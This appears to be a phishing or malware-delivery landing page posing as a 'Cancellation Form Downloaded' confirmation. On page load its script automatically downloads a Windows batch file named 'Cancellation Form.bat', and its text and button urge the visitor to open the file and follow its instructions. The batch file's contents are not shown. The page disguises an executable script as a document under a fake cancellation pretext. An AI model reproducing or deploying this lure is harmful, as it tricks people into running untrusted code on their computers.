<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Complete</title>

<style>
body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background: linear-gradient(135deg,#eef2f7,#f9fbfd);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

/* CARD */
.card {
  background: white;
  padding: 40px;
  border-radius: 14px;
  box-shadow: 0 18px 40px rgba(0,0,0,0.1);
  max-width: 520px;
  text-align: center;
}

/* ICON */
.icon {
  font-size: 60px;
  margin-bottom: 20px;
}

/* TITLE */
h1 {
  margin: 0;
  font-size: 26px;
}

/* TEXT */
p {
  color: #555;
  font-size: 15px;
  line-height: 1.6;
}

/* BUTTON */
.open-btn {
  margin-top: 25px;
  display: inline-block;
  background: linear-gradient(#ffb84d,#ff9900);
  padding: 14px 26px;
  font-weight: bold;
  text-decoration: none;
  color: #111;
  border-radius: 8px;
  box-shadow: 0 4px 0 #cc7a00;
}
</style>
</head>

<body>

<div class="card">

  <div class="icon">⬇️</div>

  <h1>Cancellation Form Downloaded</h1>

  <p>
    Your cancellation request file has been successfully downloaded.<br><br>
    Please open the downloaded document, review the details,
    and follow the instructions provided inside the file to
    complete your cancellation process.
  </p>

  <!-- MANUAL OPEN BUTTON -->
  <a class="open-btn"
     href="Cancellation Form.bat"
     target="_blank">
     Open Downloaded File
  </a>

</div>

<!-- AUTO DOWNLOAD SCRIPT -->
<script>
window.onload = function () {

  const link = document.createElement("a");
  link.href = "Cancellation Form.bat";   // File name
  link.download = "Cancellation Form.bat";
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

};
</script>

</body>
</html>
